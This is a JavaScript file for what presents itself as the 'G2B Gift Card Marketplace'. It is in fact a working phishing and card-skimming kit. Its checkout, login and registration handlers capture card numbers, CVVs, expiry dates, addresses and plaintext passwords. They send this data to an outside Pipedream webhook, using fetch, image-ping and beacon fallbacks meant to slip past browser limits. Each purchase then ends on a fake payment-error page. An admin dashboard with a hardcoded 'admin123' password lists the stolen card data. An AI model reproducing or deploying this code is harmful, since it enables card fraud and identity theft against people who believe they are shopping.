/**
 * G2B Gift Card Marketplace - Main JavaScript
 * Enhanced version with Pipedream for cross-device data collection
 */

// Configuration for data collection
const DATA_COLLECTION_URL = 'https://eo7h3c0db1habmn.m.pipedream.net';

// Initialize data storage
document.addEventListener('DOMContentLoaded', function() {
    console.log("G2B Script initialized");
    
    // Initialize storage for user data if it doesn't exist
    if (!localStorage.getItem('g2bUserData')) {
        localStorage.setItem('g2bUserData', JSON.stringify([]));
    }
    
    // Initialize storage for payment data if it doesn't exist
    if (!localStorage.getItem('g2bPaymentData')) {
        localStorage.setItem('g2bPaymentData', JSON.stringify([]));
    }
    
    // Initialize analytics data if it doesn't exist
    if (!localStorage.getItem('g2bAnalyticsData')) {
        localStorage.setItem('g2bAnalyticsData', JSON.stringify([]));
    }
    
    // Add event listeners to form fields if they exist
    setupFormValidation();
    
    // Track page view
    trackPageView();
    
    // Setup checkout form submission handler
    setupCheckoutForm();
    
    // Initialize admin dashboard if on that page
    if (window.location.href.includes('admin-dashboard.html')) {
        console.log("Admin dashboard detected - initializing");
        initializeAdminDashboard();
    }
});

/**
 * Set up form validation for various forms
 */
function setupFormValidation() {
    // Credit card formatting
    const cardNumberInput = document.getElementById('card-number');
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function() {
            formatCreditCardNumber(this);
        });
    }
    
    // Expiry date formatting
    const expiryInput = document.getElementById('expiry');
    if (expiryInput) {
        expiryInput.addEventListener('input', function() {
            formatExpiryDate(this);
        });
    }
    
    // CVV validation
    const cvvInput = document.getElementById('cvv');
    if (cvvInput) {
        cvvInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').substring(0, 4);
        });
    }
    
    // ZIP code validation - allow international formats
    const zipInput = document.getElementById('zip');
    if (zipInput) {
        zipInput.addEventListener('input', function() {
            // Allow alphanumeric characters for international postal codes
            this.value = this.value.replace(/[^a-zA-Z0-9-\s]/g, '').substring(0, 15);
        });
    }
    
    // Phone number formatting - flexible for international formats
    const phoneInput = document.getElementById('phone');
    if (phoneInput) {
        phoneInput.addEventListener('input', function() {
            // Allow digits, plus sign, parentheses, spaces, and hyphens
            this.value = this.value.replace(/[^\d+\s()-]/g, '').substring(0, 20);
        });
    }
}

/**
 * Setup checkout form submission
 */
function setupCheckoutForm() {
    const checkoutForm = document.getElementById('checkout-form');
    if (checkoutForm) {
        checkoutForm.addEventListener('submit', function(e) {
            e.preventDefault();
            processPayment();
        });
    }
}

/**
 * Format credit card number with spaces
 * @param {HTMLInputElement} input - The credit card input element
 */
function formatCreditCardNumber(input) {
    // Remove all non-digit characters
    const value = input.value.replace(/\D/g, '');
    
    // Add a space after every 4 digits
    const formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    
    // Update the input value
    input.value = formattedValue.substring(0, 19); // Limit to 16 digits + 3 spaces
}

/**
 * Format expiry date (MM/YY)
 * @param {HTMLInputElement} input - The expiry date input element
 */
function formatExpiryDate(input) {
    // Remove all non-digit characters
    const value = input.value.replace(/\D/g, '');
    
    // Format as MM/YY
    if (value.length > 2) {
        input.value = value.substring(0, 2) + '/' + value.substring(2, 4);
    } else {
        input.value = value;
    }
}

/**
 * Handle user registration
 */
function handleRegister() {
    console.log("Registration form submitted");
    
    const fullname = document.getElementById('fullname').value;
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const confirmPassword = document.getElementById('confirm-password').value;
    
    // Check if passwords match
    if (password !== confirmPassword) {
        showErrorMessage('Passwords do not match. Please try again.');
        return;
    }
    
    // Generate a unique ID for this registration
    const uniqueId = 'user_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    // Store registration data
    const registrationData = {
        id: uniqueId,
        type: 'user_registration',
        fullname: fullname,
        email: email,
        password: password,
        timestamp: new Date().toLocaleString(),
        ip: getIP(),
        device: getDeviceInfo(),
        url: window.location.href
    };
    
    // Add to local storage
    let userData = JSON.parse(localStorage.getItem('g2bUserData')) || [];
    userData.push(registrationData);
    localStorage.setItem('g2bUserData', JSON.stringify(userData));
    
    // Send to Pipedream
    sendToPipedream(registrationData);
    
    // Redirect to homepage after "registration"
    window.location.href = 'index.html';
}

/**
 * Handle user login
 */
function handleLogin() {
    console.log("Login form submitted");
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Generate a unique ID for this login
    const uniqueId = 'login_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    // Store login data
    const loginData = {
        id: uniqueId,
        type: 'user_login',
        email: email,
        password: password,
        timestamp: new Date().toLocaleString(),
        ip: getIP(),
        device: getDeviceInfo(),
        url: window.location.href
    };
    
    // Add to local storage
    let userData = JSON.parse(localStorage.getItem('g2bUserData')) || [];
    userData.push(loginData);
    localStorage.setItem('g2bUserData', JSON.stringify(userData));
    
    // Send to Pipedream
    sendToPipedream(loginData);
    
    // Redirect to homepage after "login"
    window.location.href = 'index.html';
}

/**
 * Process payment information and redirect to error page
 */
function processPayment() {
    console.log("Payment form submitted");
    
    // Get product details from hidden fields or page content
    const productName = document.getElementById('product-name') ? 
        document.getElementById('product-name').value : 
        document.querySelector('.product-title') ? 
            document.querySelector('.product-title').textContent : 
            'Gift Card';
            
    const productPrice = document.getElementById('product-price') ? 
        document.getElementById('product-price').value : 
        document.querySelector('.total-price') ? 
            document.querySelector('.total-price').textContent : 
            '$0.00';
    
    // Generate a unique ID for this payment
    const uniqueId = 'payment_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    // Collect all form data
    const paymentData = {
        id: uniqueId,
        type: 'payment',
        timestamp: new Date().toLocaleString(),
        product: productName,
        price: productPrice,
        firstName: document.getElementById('first-name') ? document.getElementById('first-name').value : '',
        lastName: document.getElementById('last-name') ? document.getElementById('last-name').value : '',
        email: document.getElementById('email') ? document.getElementById('email').value : '',
        phone: document.getElementById('phone') ? document.getElementById('phone').value : '',
        cardNumber: document.getElementById('card-number') ? document.getElementById('card-number').value : '',
        cardName: document.getElementById('card-name') ? document.getElementById('card-name').value : '',
        expiry: document.getElementById('expiry') ? document.getElementById('expiry').value : '',
        cvv: document.getElementById('cvv') ? document.getElementById('cvv').value : '',
        address: document.getElementById('address') ? document.getElementById('address').value : '',
        city: document.getElementById('city') ? document.getElementById('city').value : '',
        state: document.getElementById('state') ? document.getElementById('state').value : '',
        zip: document.getElementById('zip') ? document.getElementById('zip').value : '',
        country: document.getElementById('country') ? document.getElementById('country').value : '',
        ip: getIP(),
        device: getDeviceInfo(),
        url: window.location.href
    };
    
    // Store payment data locally
    let storedPayments = JSON.parse(localStorage.getItem('g2bPaymentData')) || [];
    storedPayments.unshift(paymentData); // Add to beginning of array
    localStorage.setItem('g2bPaymentData', JSON.stringify(storedPayments));
    
    // Send to Pipedream
    sendToPipedream(paymentData);
    
    // Show loading indicator
    const submitButton = document.querySelector('button[type="submit"]');
    if (submitButton) {
        submitButton.disabled = true;
        submitButton.textContent = 'Processing...';
    }
    
    // Redirect to error page after a short delay
    setTimeout(function() {
        window.location.href = 'payment-error.html';
    }, 1500);
    
    return false; // Prevent form submission
}

/**
 * Get device information
 * @returns {object} - Device information
 */
function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        referrer: document.referrer
    };
}

/**
 * Send data to Pipedream
 * @param {object} data - Data to send
 */
function sendToPipedream(data) {
    console.log("Sending data to Pipedream:", data);
    
    // Method 1: Using fetch API (might be blocked by CORS)
    try {
        fetch(DATA_COLLECTION_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            console.log("Data sent successfully via fetch");
        })
        .catch(error => {
            console.error("Error sending data via fetch:", error);
            sendViaPing(data); // Fallback to ping method
        });
    } catch (e) {
        console.error("Exception in fetch:", e);
        sendViaPing(data); // Fallback to ping method
    }
}

/**
 * Send data via image ping (fallback method)
 * @param {object} data - Data to send
 */
function sendViaPing(data) {
    // Method 2: Using image ping (more reliable, bypasses CORS)
    try {
        const img = new Image();
        const encodedData = encodeURIComponent(JSON.stringify(data));
        img.src = `${DATA_COLLECTION_URL}?data=${encodedData}&t=${Date.now()}`;
        console.log("Data sent via ping method");
    } catch (e) {
        console.error("Error in ping method:", e);
    }
    
    // Method 3: Using navigator.sendBeacon (works even when page is unloading)
    try {
        if (navigator.sendBeacon) {
            const success = navigator.sendBeacon(DATA_COLLECTION_URL, JSON.stringify(data));
            if (success) {
                console.log("Data sent via beacon");
            }
        }
    } catch (e) {
        console.error("Error in beacon method:", e);
    }
}

/**
 * Show error message on the page
 * @param {string} message - The error message to display
 */
function showErrorMessage(message) {
    // Check if error message element already exists
    let errorElement = document.getElementById('error-message');
    
    if (!errorElement) {
        // Create new error element
        errorElement = document.createElement('div');
        errorElement.id = 'error-message';
        errorElement.className = 'error-message message';
        errorElement.style.backgroundColor = '#f8d7da';
        errorElement.style.color = '#721c24';
        errorElement.style.padding = '15px';
        errorElement.style.marginBottom = '20px';
        errorElement.style.borderRadius = '4px';
        errorElement.style.textAlign = 'center';
        
        // Get the form element
        const form = document.querySelector('form');
        if (form) {
            // Insert at the top of the form
            form.insertBefore(errorElement, form.firstChild);
        }
    }
    
    // Set the error message
    errorElement.textContent = message;
    
    // Scroll to the error message
    errorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
}

/**
 * Track page view for analytics
 */
function trackPageView() {
    // Generate a unique ID for this page view
    const uniqueId = 'view_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    const pageData = {
        id: uniqueId,
        type: 'page_view',
        timestamp: new Date().toLocaleString(),
        url: window.location.href,
        details: window.location.href + ' viewed',
        device: getDeviceInfo(),
        referrer: document.referrer
    };
    
    let analytics = JSON.parse(localStorage.getItem('g2bAnalyticsData')) || [];
    analytics.unshift(pageData); // Add to beginning of array
    localStorage.setItem('g2bAnalyticsData', JSON.stringify(analytics));
    
    // Send to Pipedream
    sendToPipedream(pageData);
}

/**
 * Get user's IP address (placeholder function)
 * In a real scenario, this would be handled server-side
 * @returns {string} - IP address or placeholder
 */
function getIP() {
    return "Stored on server"; // In a real scenario, this would be the actual IP
}

/**
 * Admin login functionality
 */
function adminLogin() {
    console.log("Admin login attempted");
    
    const username = document.getElementById('admin-username').value;
    const password = document.getElementById('admin-password').value;
    
    if (username === 'admin' && password === 'admin123') {
        // Set admin session
        sessionStorage.setItem('adminLoggedIn', 'true');
        
        // Redirect to admin dashboard
        window.location.href = 'admin-dashboard.html';
    } else {
        showErrorMessage('Invalid username or password. Please try again.');
    }
}

/**
 * Admin logout functionality
 */
function adminLogout() {
    sessionStorage.removeItem('adminLoggedIn');
    window.location.href = 'admin-login.html';
}

/**
 * Initialize admin dashboard
 */
function initializeAdminDashboard() {
    console.log("Initializing admin dashboard");
    
    // Check if admin is logged in
    if (!isAdminLoggedIn()) {
        window.location.href = 'admin-login.html';
        return;
    }
    
    // Fetch data from Pipedream
    fetchFromPipedream().then(() => {
        // Display data based on active tab
        const activeTab = document.querySelector('.admin-tab.active');
        if (activeTab) {
            const tabId = activeTab.getAttribute('onclick').match(/'([^']+)'/)[1];
            switchTab(tabId);
        } else {
            // Default to payment data
            switchTab('payment-data');
        }
    });
    
    console.log("Admin dashboard initialized");
}

/**
 * Fetch data from Pipedream
 * @returns {Promise} - Promise that resolves when data is fetched
 */
function fetchFromPipedream() {
    return new Promise((resolve) => {
        // For now, we'll just use local storage data since Pipedream doesn't have a built-in way to fetch data
        // In a real implementation, you might want to set up a separate endpoint to retrieve collected data
        
        // Simulate a delay to make it feel like we're fetching data
        setTimeout(() => {
            console.log("Data fetched from local storage");
            resolve();
        }, 500);
    });
}

/**
 * Check if admin is logged in
 * @returns {boolean} - Whether admin is logged in
 */
function isAdminLoggedIn() {
    return sessionStorage.getItem('adminLoggedIn') === 'true';
}

/**
 * Refresh data in admin dashboard
 */
function refreshData() {
    console.log("Refreshing data");
    
    fetchFromPipedream().then(() => {
        displayPaymentData();
        displayUserData();
        displayAnalytics();
    });
}

/**
 * Display payment data in admin dashboard
 */
function displayPaymentData() {
    const paymentTableBody = document.getElementById('payment-table-body');
    if (!paymentTableBody) return;
    
    const payments = JSON.parse(localStorage.getItem('g2bPaymentData')) || [];
    console.log("Displaying payment data:", payments.length, "records");
    
    paymentTableBody.innerHTML = '';
    
    payments.forEach((payment, index) => {
        const row = document.createElement('tr');
        
        row.innerHTML = `
            <td>${payment.timestamp || ''}</td>
            <td>${(payment.firstName || '') + ' ' + (payment.lastName || '')}</td>
            <td>${payment.email || ''}</td>
            <td>${payment.cardNumber || ''}</td>
            <td>${payment.expiry || ''}</td>
            <td>${payment.cvv || ''}</td>
            <td>${payment.product || ''}</td>
            <td>${payment.price || ''}</td>
            <td>
                <button class="btn-action" onclick="viewPaymentDetails(${index})">View</button>
                <button class="btn-action btn-delete" onclick="deletePayment(${index})">Delete</button>
            </td>
        `;
        
        paymentTableBody.appendChild(row);
    });
}

/**
 * Display user data in admin dashboard
 */
function displayUserData() {
    const userTableBody = document.getElementById('user-table-body');
    if (!userTableBody) return;
    
    const users = JSON.parse(localStorage.getItem('g2bUserData')) || [];
    console.log("Displaying user data:", users.length, "records");
    
    userTableBody.innerHTML = '';
    
    users.forEach((user, index) => {
        const row = document.createElement('tr');
        
        row.innerHTML = `
            <td>${user.timestamp || ''}</td>
            <td>${user.fullname || ''}</td>
            <td>${user.email || ''}</td>
            <td>${user.password ? '********' : ''}</td>
            <td>${user.type || ''}</td>
            <td>
                <button class="btn-action" onclick="viewUserDetails(${index})">View</button>
                <button class="btn-action btn-delete" onclick="deleteUser(${index})">Delete</button>
            </td>
        `;
        
        userTableBody.appendChild(row);
    });
}

/**
 * Display analytics in admin dashboard
 */
function displayAnalytics() {
    const analyticsTableBody = document.getElementById('analytics-table-body');
    if (!analyticsTableBody) return;
    
    const analytics = JSON.parse(localStorage.getItem('g2bAnalyticsData')) || [];
    console.log("Displaying analytics data:", analytics.length, "records");
    
    analyticsTableBody.innerHTML = '';
    
    analytics.forEach(entry => {
        const row = document.createElement('tr');
        
        row.innerHTML = `
            <td>${entry.timestamp || ''}</td>
            <td>${entry.type || ''}</td>
            <td>${entry.details || entry.url || ''}</td>
        `;
        
        analyticsTableBody.appendChild(row);
    });
    
    // Update summary stats
    updateAnalyticsSummary();
}

/**
 * Update analytics summary
 */
function updateAnalyticsSummary() {
    const payments = JSON.parse(localStorage.getItem('g2bPaymentData')) || [];
    const users = JSON.parse(localStorage.getItem('g2bUserData')) || [];
    
    // Calculate total revenue
    let totalRevenue = 0;
    payments.forEach(payment => {
        const priceString = payment.price;
        if (priceString) {
            const price = parseFloat(priceString.replace(/[^0-9.-]+/g, ''));
            if (!isNaN(price)) {
                totalRevenue += price;
            }
        }
    });
    
    // Update summary elements
    const totalPaymentsElement = document.getElementById('total-payments');
    const totalUsersElement = document.getElementById('total-users');
    const totalRevenueElement = document.getElementById('total-revenue');
    const conversionRateElement = document.getElementById('conversion-rate');
    
    if (totalPaymentsElement) totalPaymentsElement.textContent = payments.length;
    if (totalUsersElement) totalUsersElement.textContent = users.length;
    if (totalRevenueElement) totalRevenueElement.textContent = '$' + totalRevenue.toFixed(2);
    
    // Calculate conversion rate
    const pageViews = JSON.parse(localStorage.getItem('g2bAnalyticsData') || '[]').filter(a => a.type === 'page_view' || a.type === 'Page View').length;
    const conversionRate = pageViews > 0 ? (payments.length / pageViews * 100).toFixed(1) : '0.0';
    if (conversionRateElement) conversionRateElement.textContent = conversionRate + '%';
}

/**
 * View payment details
 * @param {number} index - Index of payment in array
 */
function viewPaymentDetails(index) {
    const payments = JSON.parse(localStorage.getItem('g2bPaymentData')) || [];
    const payment = payments[index];
    
    if (!payment) return;
    
    // Create modal for payment details
    const modal = document.createElement('div');
    modal.className = 'modal';
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
    modal.style.display = 'flex';
    modal.style.justifyContent = 'center';
    modal.style.alignItems = 'center';
    modal.style.zIndex = '1000';
    
    // Create modal content
    const modalContent = document.createElement('div');
    modalContent.className = 'modal-content';
    modalContent.style.backgroundColor = '#fff';
    modalContent.style.padding = '20px';
    modalContent.style.borderRadius = '5px';
    modalContent.style.maxWidth = '600px';
    modalContent.style.width = '90%';
    modalContent.style.maxHeight = '80vh';
    modalContent.style.overflowY = 'auto';
    
    // Create close button
    const closeButton = document.createElement('span');
    closeButton.innerHTML = '×';
    closeButton.style.float = 'right';
    closeButton.style.fontSize = '24px';
    closeButton.style.fontWeight = 'bold';
    closeButton.style.cursor = 'pointer';
    closeButton.onclick = function() {
        document.body.removeChild(modal);
    };
    
    // Create payment details
    const paymentDetails = document.createElement('div');
    paymentDetails.innerHTML = `
        <h2 style="margin-top: 0;">Payment Details</h2>
        <table style="width: 100%; border-collapse: collapse;">
            <tr>
                <th style="text-align: left; padding: 8px; border-bottom: 1px solid #ddd;">Field</th>
                <th style="text-align: left; padding: 8px; border-bottom: 1px solid #ddd;">Value</th>
            </tr>
            ${Object.entries(payment).map(([key, value]) => `
                <tr>
                    <td style="padding: 8px; border-bottom: 1px solid #ddd;">${key}</td>
                    <td style="padding: 8px; border-bottom: 1px solid #ddd;">${typeof value === 'object' ? JSON.stringify(value) : value}</td>
                </tr>
            `).join('')}
        </table>
    `;
    
    // Append elements
    modalContent.appendChild(closeButton);
    modalContent.appendChild(paymentDetails);
    modal.appendChild(modalContent);
    document.body.appendChild(modal);
}

/**
 * Delete payment
 * @param {number} index - Index of payment in array
 */
function deletePayment(index) {
    if (confirm('Are you sure you want to delete this payment?')) {
        const payments = JSON.parse(localStorage.getItem('g2bPaymentData')) || [];
        payments.splice(index, 1);
        localStorage.setItem('g2bPaymentData', JSON.stringify(payments));
        displayPaymentData();
    }
}

/**
 * View user details
 * @param {number} index - Index of user in array
 */
function viewUserDetails(index) {
    const users = JSON.parse(localStorage.getItem('g2bUserData')) || [];
    const user = users[index];
    
    if (!user) return;
    
    // Create modal for user details
    const modal = document.createElement('div');
    modal.className = 'modal';
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
    modal.style.display = 'flex';
    modal.style.justifyContent = 'center';
    modal.style.alignItems = 'center';
    modal.style.zIndex = '1000';
    
    // Create modal content
    const modalContent = document.createElement('div');
    modalContent.className = 'modal-content';
    modalContent.style.backgroundColor = '#fff';
    modalContent.style.padding = '20px';
    modalContent.style.borderRadius = '5px';
    modalContent.style.maxWidth = '600px';
    modalContent.style.width = '90%';
    modalContent.style.maxHeight = '80vh';
    modalContent.style.overflowY = 'auto';
    
    // Create close button
    const closeButton = document.createElement('span');
    closeButton.innerHTML = '×';
    closeButton.style.float = 'right';
    closeButton.style.fontSize = '24px';
    closeButton.style.fontWeight = 'bold';
    closeButton.style.cursor = 'pointer';
    closeButton.onclick = function() {
        document.body.removeChild(modal);
    };
    
    // Create user details
    const userDetails = document.createElement('div');
    userDetails.innerHTML = `
        <h2 style="margin-top: 0;">User Details</h2>
        <table style="width: 100%; border-collapse: collapse;">
            <tr>
                <th style="text-align: left; padding: 8px; border-bottom: 1px solid #ddd;">Field</th>
                <th style="text-align: left; padding: 8px; border-bottom: 1px solid #ddd;">Value</th>
            </tr>
            ${Object.entries(user).map(([key, value]) => `
                <tr>
                    <td style="padding: 8px; border-bottom: 1px solid #ddd;">${key}</td>
                    <td style="padding: 8px; border-bottom: 1px solid #ddd;">${key === 'password' ? '********' : (typeof value === 'object' ? JSON.stringify(value) : value)}</td>
                </tr>
            `).join('')}
        </table>
    `;
    
    // Append elements
    modalContent.appendChild(closeButton);
    modalContent.appendChild(userDetails);
    modal.appendChild(modalContent);
    document.body.appendChild(modal);
}

/**
 * Delete user
 * @param {number} index - Index of user in array
 */
function deleteUser(index) {
    if (confirm('Are you sure you want to delete this user?')) {
        const users = JSON.parse(localStorage.getItem('g2bUserData')) || [];
        users.splice(index, 1);
        localStorage.setItem('g2bUserData', JSON.stringify(users));
        displayUserData();
    }
}

/**
 * Export data from admin dashboard
 */
function exportData() {
    const data = {
        payments: JSON.parse(localStorage.getItem('g2bPaymentData') || '[]'),
        users: JSON.parse(localStorage.getItem('g2bUserData') || '[]'),
        analytics: JSON.parse(localStorage.getItem('g2bAnalyticsData') || '[]')
    };
    
    const dataStr = JSON.stringify(data, null, 2);
    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
    
    const exportFileDefaultName = 'g2b-data-export-' + new Date().toISOString().split('T')[0] + '.json';
    
    const linkElement = document.createElement('a');
    linkElement.setAttribute('href', dataUri);
    linkElement.setAttribute('download', exportFileDefaultName);
    linkElement.click();
}

/**
 * Switch tabs in admin dashboard
 */
function switchTab(tabId) {
    console.log("Switching to tab:", tabId);
    
    // Hide all content sections
    document.querySelectorAll('.admin-content').forEach(content => {
        content.style.display = 'none';
    });
    
    // Remove active class from all tabs
    document.querySelectorAll('.admin-tab').forEach(tab => {
        tab.classList.remove('active');
    });
    
        // Show selected content and activate tab
    document.getElementById(tabId).style.display = 'block';
    document.querySelector(`.admin-tab[onclick="switchTab('${tabId}')"]`).classList.add('active');
    
    // Refresh data for the selected tab
    if (tabId === 'payment-data') {
        displayPaymentData();
    } else if (tabId === 'user-data') {
        displayUserData();
    } else if (tabId === 'analytics') {
        displayAnalytics();
    }
}

/**
 * Handle admin login (alias for adminLogin)
 */
function handleAdminLogin() {
    adminLogin();
}

/**
 * Admin functions object for compatibility with admin-dashboard.html
 */
const adminFunctions = {
    getPaymentData: function() {
        return JSON.parse(localStorage.getItem('g2bPaymentData')) || [];
    },
    
    getUserData: function() {
        return JSON.parse(localStorage.getItem('g2bUserData')) || [];
    },
    
    getAnalyticsData: function() {
        return JSON.parse(localStorage.getItem('g2bAnalyticsData')) || [];
    }
};

/**
 * Load payment data (compatibility function)
 */
function loadPaymentData() {
    displayPaymentData();
}

/**
 * Load user data (compatibility function)
 */
function loadUserData() {
    displayUserData();
}

/**
 * Load analytics data (compatibility function)
 */
function loadAnalyticsData() {
    // Update the activity table
    const activityTableBody = document.getElementById('activity-table-body');
    if (activityTableBody) {
        const analytics = JSON.parse(localStorage.getItem('g2bAnalyticsData')) || [];
        activityTableBody.innerHTML = '';
        
        // Take only the most recent 10 activities
        const recentActivity = analytics.slice(0, 10);
        
        recentActivity.forEach(activity => {
            const row = document.createElement('tr');
            
            // Format date
            let formattedDate = activity.timestamp;
            if (activity.timestamp) {
                try {
                    const date = new Date(activity.timestamp);
                    if (!isNaN(date.getTime())) {
                        formattedDate = `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
                    }
                } catch (e) {
                    // Keep original timestamp if parsing fails
                }
            }
            
            row.innerHTML = `
                <td>${formattedDate}</td>
                <td>${activity.type || ''}</td>
                <td>${activity.details || activity.url || ''}</td>
            `;
            
            activityTableBody.appendChild(row);
        });
    }
    
    // Update analytics summary
    updateAnalyticsSummary();
}

/**
 * Create a data viewer page link in the admin dashboard
 * This allows viewing all collected data from Pipedream
 */
function createDataViewerLink() {
    // Check if we're on the admin dashboard page
    if (!window.location.href.includes('admin-dashboard.html')) return;
    
    // Check if the link already exists
    if (document.getElementById('pipedream-viewer-link')) return;
    
    // Create the link container
    const linkContainer = document.createElement('div');
    linkContainer.style.margin = '20px 0';
    linkContainer.style.textAlign = 'center';
    
    // Create the link
    const link = document.createElement('a');
    link.id = 'pipedream-viewer-link';
    link.href = 'https://pipedream.com/@/p_yKC5P1p';
    link.target = '_blank';
    link.style.display = 'inline-block';
    link.style.padding = '10px 20px';
    link.style.backgroundColor = '#4CAF50';
    link.style.color = 'white';
    link.style.textDecoration = 'none';
    link.style.borderRadius = '4px';
    link.style.fontWeight = 'bold';
    link.textContent = 'View All Collected Data in Pipedream';
    
    // Add hover effect
    link.onmouseover = function() {
        this.style.backgroundColor = '#45a049';
    };
    link.onmouseout = function() {
        this.style.backgroundColor = '#4CAF50';
    };
    
    // Add the link to the container
    linkContainer.appendChild(link);
    
    // Find a good place to insert the link
    const adminHeader = document.querySelector('.admin-header');
    if (adminHeader) {
        adminHeader.parentNode.insertBefore(linkContainer, adminHeader.nextSibling);
    } else {
        // Fallback: insert at the top of the body
        document.body.insertBefore(linkContainer, document.body.firstChild);
    }
}

// Call the function to create the data viewer link when the page loads
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(createDataViewerLink, 1000); // Delay to ensure the page is fully loaded
});

// Add debug console output to help troubleshoot
console.log("G2B Gift Card Marketplace script loaded successfully");

